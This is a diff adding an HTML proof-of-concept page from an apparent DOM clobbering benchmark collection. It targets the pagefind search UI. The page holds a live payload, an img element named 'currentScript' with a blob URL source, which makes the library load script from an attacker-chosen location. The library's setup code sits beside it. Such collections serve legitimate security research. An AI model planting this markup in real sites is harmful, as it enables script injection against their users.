@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - pagefind</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;currentScript&quot; src=&quot;blob:http://localhost:9999/ui.js&quot;&gt;&lt;/img&gt;</pre>
+  <img name="currentScript" src="blob:http://localhost:9999/ui.js"></img>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;link href=&quot;pagefind/pagefind-ui.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;script src=&quot;pagefind/pagefind-ui.js&quot;&gt;&lt;/script&gt;
+&lt;div id=&quot;search&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+    window.addEventListener(&#x27;DOMContentLoaded&#x27;, (event) =&gt; {
+        new PagefindUI({ element: &quot;#search&quot;, showSubResults: true });
+    });
+&lt;/script&gt;</pre>
+  <link href="pagefind/pagefind-ui.css" rel="stylesheet">
+<script src="pagefind/pagefind-ui.js"></script>
+<div id="search"></div>
+<script>
+    window.addEventListener('DOMContentLoaded', (event) => {
+        new PagefindUI({ element: "#search", showSubResults: true });
+    });
+</script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../polyfills/poc.html">Next: polyfills</a>
+  </div>
+</section>
+
+</body>
+</html>
